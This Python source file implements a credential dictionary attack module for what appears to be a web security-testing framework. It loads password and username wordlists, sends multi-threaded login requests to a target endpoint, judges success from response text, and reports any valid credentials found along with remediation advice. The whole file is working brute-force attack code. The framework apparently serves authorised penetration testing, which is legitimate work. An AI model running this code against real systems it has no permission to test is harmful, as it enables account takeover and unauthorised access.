"""
Dictionary Attack Module.

This module implements a dictionary-based attack against web authentication endpoints.
It uses wordlists of common passwords and usernames to discover valid credentials.
"""

import time
import os
from typing import Generator, Dict, Any, Optional, List
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

import requests
from requests.exceptions import RequestException

from attacks.base import BaseAttack, Finding, Severity
from attacks import AttackRegistry


@AttackRegistry.register("dictionary")
class DictionaryAttack(BaseAttack):
    """
    Dictionary attack for web authentication.
    
    This attack uses wordlists of common passwords (and optionally usernames)
    to discover valid credentials against a target login endpoint.
    """
    
    name = "Dictionary Attack"
    description = "Uses wordlists to discover valid credentials through common passwords"
    
    # Default configuration
    DEFAULT_MAX_THREADS = 5
    DEFAULT_TIMEOUT = 10
    DEFAULT_DELAY = 0.1
    DEFAULT_WORDLIST_DIR = "wordlists"
    
    def __init__(self):
        super().__init__()
        self._total_attempts = 0
        self._current_attempt = 0
        self._session: Optional[requests.Session] = None
        self._base_path = Path(__file__).parent.parent
    
    def configure(self, **kwargs) -> None:
        """
        Configure dictionary attack parameters.
        
        Args:
            username: Target username to attack (if not using username wordlist)
            password_wordlist: Path to password wordlist file (required)
            username_wordlist: Path to username wordlist file (optional, for user enumeration)
            login_url: Full URL of the login endpoint (optional, will use target + /login)
            username_field: Name of username form field (default: username)
            password_field: Name of password form field (default: password)
            success_indicator: String that indicates successful login (default: None)
            failure_indicator: String that indicates failed login (default: "invalid")
            max_threads: Maximum concurrent threads (default: 5)
            timeout: Request timeout in seconds (default: 10)
            delay: Delay between requests in seconds (default: 0.1)
            http_method: HTTP method to use (default: POST)
            stop_on_success: Stop when first valid credential found (default: True)
        """
        self._config = {
            "username": kwargs.get("username", "admin"),
            "password_wordlist": kwargs.get("password_wordlist", "wordlists/common_passwords.txt"),
            "username_wordlist": kwargs.get("username_wordlist"),
            "login_url": kwargs.get("login_url"),
            "username_field": kwargs.get("username_field", "username"),
            "password_field": kwargs.get("password_field", "password"),
            "success_indicator": kwargs.get("success_indicator"),
            "failure_indicator": kwargs.get("failure_indicator", "invalid"),
            "max_threads": kwargs.get("max_threads", self.DEFAULT_MAX_THREADS),
            "timeout": kwargs.get("timeout", self.DEFAULT_TIMEOUT),
            "delay": kwargs.get("delay", self.DEFAULT_DELAY),
            "http_method": kwargs.get("http_method", "POST").upper(),
            "stop_on_success": kwargs.get("stop_on_success", True),
        }
    
    def get_config_options(self) -> Dict[str, Any]:
        """Return available configuration options."""
        return {
            "username": {
                "type": "string",
                "default": "admin",
                "description": "Target username (ignored if username_wordlist is set)"
            },
            "password_wordlist": {
                "type": "file",
                "default": "wordlists/common_passwords.txt",
                "description": "Path to password wordlist file",
                "required": True
            },
            "username_wordlist": {
                "type": "file",
                "default": None,
                "description": "Path to username wordlist file (for user enumeration)"
            },
            "login_url": {
                "type": "string",
                "default": None,
                "description": "Full login URL (defaults to target/login)"
            },
            "username_field": {
                "type": "string",
                "default": "username",
                "description": "Form field name for username"
            },
            "password_field": {
                "type": "string",
                "default": "password",
                "description": "Form field name for password"
            },
            "success_indicator": {
                "type": "string",
                "default": None,
                "description": "Text indicating successful login"
            },
            "failure_indicator": {
                "type": "string",
                "default": "invalid",
                "description": "Text indicating failed login"
            },
            "max_threads": {
                "type": "integer",
                "default": self.DEFAULT_MAX_THREADS,
                "description": "Maximum concurrent threads",
                "min": 1,
                "max": 20
            },
            "timeout": {
                "type": "integer",
                "default": self.DEFAULT_TIMEOUT,
                "description": "Request timeout in seconds"
            },
            "delay": {
                "type": "float",
                "default": self.DEFAULT_DELAY,
                "description": "Delay between requests in seconds"
            },
            "http_method": {
                "type": "select",
                "default": "POST",
                "options": ["POST", "GET"],
                "description": "HTTP method to use"
            },
            "stop_on_success": {
                "type": "boolean",
                "default": True,
                "description": "Stop when first valid credential is found"
            }
        }
    
    def _resolve_wordlist_path(self, wordlist_path: str) -> Path:
        """Resolve wordlist path relative to project root or as absolute path."""
        path = Path(wordlist_path)
        
        if path.is_absolute() and path.exists():
            return path
        
        # Try relative to project root
        full_path = self._base_path / wordlist_path
        if full_path.exists():
            return full_path
        
        # Try relative to current directory
        if path.exists():
            return path
        
        raise FileNotFoundError(f"Wordlist not found: {wordlist_path}")
    
    def _load_wordlist(self, wordlist_path: str) -> List[str]:
        """Load words from a wordlist file."""
        path = self._resolve_wordlist_path(wordlist_path)
        
        words = []
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                word = line.strip()
                if word and not word.startswith('#'):
                    words.append(word)
        
        return words
    
    def _generate_credentials(self) -> Generator[tuple, None, None]:
        """Generate username/password combinations from wordlists."""
        password_wordlist = self._config.get("password_wordlist", "wordlists/common_passwords.txt")
        username_wordlist = self._config.get("username_wordlist")
        single_username = self._config.get("username", "admin")
        
        try:
            passwords = self._load_wordlist(password_wordlist)
        except FileNotFoundError as e:
            raise ValueError(f"Password wordlist not found: {e}")
        
        if username_wordlist:
            try:
                usernames = self._load_wordlist(username_wordlist)
            except FileNotFoundError:
                usernames = [single_username]
        else:
            usernames = [single_username]
        
        for username in usernames:
            for password in passwords:
                yield (username, password)
    
    def _count_total_attempts(self) -> int:
        """Calculate total number of credential combinations to try."""
        password_wordlist = self._config.get("password_wordlist", "wordlists/common_passwords.txt")
        username_wordlist = self._config.get("username_wordlist")
        
        try:
            passwords = self._load_wordlist(password_wordlist)
            password_count = len(passwords)
        except FileNotFoundError:
            password_count = 0
        
        if username_wordlist:
            try:
                usernames = self._load_wordlist(username_wordlist)
                username_count = len(usernames)
            except FileNotFoundError:
                username_count = 1
        else:
            username_count = 1
        
        return username_count * password_count
    
    def _try_login(self, target: str, username: str, password: str) -> Dict[str, Any]:
        """
        Attempt login with given credentials.
        
        Returns:
            dict with keys: success (bool), username (str), password (str), 
                           response_code (int), error (str or None)
        """
        if self._session is None:
            self._session = requests.Session()
        
        login_url = self._config.get("login_url") or f"{target.rstrip('/')}/login"
        username_field = self._config["username_field"]
        password_field = self._config["password_field"]
        timeout = self._config.get("timeout", self.DEFAULT_TIMEOUT)
        http_method = self._config.get("http_method", "POST")
        
        data = {
            username_field: username,
            password_field: password
        }
        
        try:
            if http_method == "POST":
                response = self._session.post(login_url, data=data, timeout=timeout, allow_redirects=True)
            else:
                response = self._session.get(login_url, params=data, timeout=timeout, allow_redirects=True)
            
            # Check for success/failure indicators
            success_indicator = self._config.get("success_indicator")
            failure_indicator = self._config.get("failure_indicator", "invalid")
            
            is_success = False
            
            if success_indicator:
                is_success = success_indicator.lower() in response.text.lower()
            elif failure_indicator:
                is_success = failure_indicator.lower() not in response.text.lower()
            else:
                is_success = response.status_code in [200, 302] and "logout" in response.text.lower()
            
            return {
                "success": is_success,
                "username": username,
                "password": password,
                "response_code": response.status_code,
                "error": None
            }
            
        except RequestException as e:
            return {
                "success": False,
                "username": username,
                "password": password,
                "response_code": None,
                "error": str(e)
            }
    
    def run(self, target: str) -> Generator[Finding, None, None]:
        """
        Execute dictionary attack against the target.
        
        Args:
            target: Target URL (base URL of the application)
            
        Yields:
            Finding objects for discovered credentials or notable events
        """
        self.reset()
        self._is_running = True
        self._session = requests.Session()
        
        # Load configuration
        password_wordlist = self._config.get("password_wordlist", "wordlists/common_passwords.txt")
        username_wordlist = self._config.get("username_wordlist")
        max_threads = self._config.get("max_threads", self.DEFAULT_MAX_THREADS)
        delay = self._config.get("delay", self.DEFAULT_DELAY)
        stop_on_success = self._config.get("stop_on_success", True)
        
        # Calculate total attempts
        try:
            self._total_attempts = self._count_total_attempts()
        except Exception as e:
            yield Finding(
                title="Dictionary Attack Failed to Start",
                severity=Severity.INFO,
                description=f"Could not load wordlists: {e}",
                evidence=f"Password wordlist: {password_wordlist}",
                remediation="Verify wordlist files exist and are readable"
            )
            self._is_running = False
            return
        
        self._current_attempt = 0
        
        # Yield info finding about attack start
        yield Finding(
            title="Dictionary Attack Started",
            severity=Severity.INFO,
            description="Starting dictionary attack with wordlist credentials",
            evidence=f"Target: {target}, Total combinations to try: {self._total_attempts}",
            remediation="N/A - Informational",
            metadata={
                "password_wordlist": password_wordlist,
                "username_wordlist": username_wordlist,
                "total_attempts": self._total_attempts
            }
        )
        
        found_credentials: List[Dict[str, str]] = []
        errors_count = 0
        
        try:
            if max_threads > 1:
                # Multi-threaded execution
                with ThreadPoolExecutor(max_workers=max_threads) as executor:
                    futures = {}
                    cred_gen = self._generate_credentials()
                    
                    # Submit initial batch
                    for _ in range(max_threads * 2):
                        if self._is_cancelled:
                            break
                        try:
                            username, password = next(cred_gen)
                            future = executor.submit(self._try_login, target, username, password)
                            futures[future] = (username, password)
                        except StopIteration:
                            break
                    
                    while futures and not self._is_cancelled:
                        # Process completed futures
                        done_futures = []
                        for future in as_completed(futures, timeout=0.1):
                            done_futures.append(future)
                        
                        for future in done_futures:
                            if self._is_cancelled:
                                break
                                
                            result = future.result()
                            self._current_attempt += 1
                            self.set_progress((self._current_attempt / self._total_attempts) * 100)
                            
                            if result["error"]:
                                errors_count += 1
                            
                            if result["success"]:
                                cred = {"username": result["username"], "password": result["password"]}
                                found_credentials.append(cred)
                                
                                yield Finding(
                                    title="Valid Credentials Found",
                                    severity=Severity.CRITICAL,
                                    description=f"Discovered valid credentials via dictionary attack",
                                    evidence=f"Username: {result['username']}, Password: {result['password']}",
                                    remediation="Enforce strong password policy, implement account lockout, enable MFA",
                                    metadata={
                                        "username": result["username"],
                                        "password": result["password"],
                                        "attempts": self._current_attempt
                                    }
                                )
                                
                                if stop_on_success:
                                    self.cancel()
                                    break
                            
                            # Remove processed future and submit new one
                            del futures[future]
                            if not self._is_cancelled:
                                try:
                                    username, password = next(cred_gen)
                                    new_future = executor.submit(self._try_login, target, username, password)
                                    futures[new_future] = (username, password)
                                except StopIteration:
                                    pass
                        
                        if delay > 0:
                            time.sleep(delay)
            else:
                # Single-threaded execution
                for username, password in self._generate_credentials():
                    if self._is_cancelled:
                        break
                    
                    result = self._try_login(target, username, password)
                    self._current_attempt += 1
                    self.set_progress((self._current_attempt / self._total_attempts) * 100)
                    
                    if result["error"]:
                        errors_count += 1
                    
                    if result["success"]:
                        cred = {"username": result["username"], "password": result["password"]}
                        found_credentials.append(cred)
                        
                        yield Finding(
                            title="Valid Credentials Found",
                            severity=Severity.CRITICAL,
                            description="Discovered valid credentials via dictionary attack",
                            evidence=f"Username: {result['username']}, Password: {result['password']}",
                            remediation="Enforce strong password policy, implement account lockout, enable MFA",
                            metadata={
                                "username": result["username"],
                                "password": result["password"],
                                "attempts": self._current_attempt
                            }
                        )
                        
                        if stop_on_success:
                            break
                    
                    if delay > 0:
                        time.sleep(delay)
        
        finally:
            self._is_running = False
            self.set_progress(100.0)
            
            if self._session:
                self._session.close()
                self._session = None
        
        # Yield summary finding
        if not found_credentials:
            yield Finding(
                title="Dictionary Attack Completed",
                severity=Severity.INFO,
                description="No valid credentials found using wordlist",
                evidence=f"Attempted {self._current_attempt} credential combinations",
                remediation="N/A - No vulnerabilities found",
                metadata={
                    "attempts": self._current_attempt,
                    "errors": errors_count,
                    "cancelled": self._is_cancelled
                }
            )
        else:
            yield Finding(
                title="Dictionary Attack Summary",
                severity=Severity.HIGH,
                description=f"Found {len(found_credentials)} valid credential(s)",
                evidence=f"Credentials found after {self._current_attempt} attempts",
                remediation="Review all discovered credentials and enforce password policy",
                metadata={
                    "credentials_found": len(found_credentials),
                    "attempts": self._current_attempt
                }
            )
        
        if errors_count > 0:
            yield Finding(
                title="Connection Errors During Attack",
                severity=Severity.LOW,
                description=f"Encountered {errors_count} connection errors during the attack",
                evidence=f"Error rate: {(errors_count/max(self._current_attempt, 1))*100:.1f}%",
                remediation="Check target availability and network connectivity",
                metadata={"error_count": errors_count}
            )
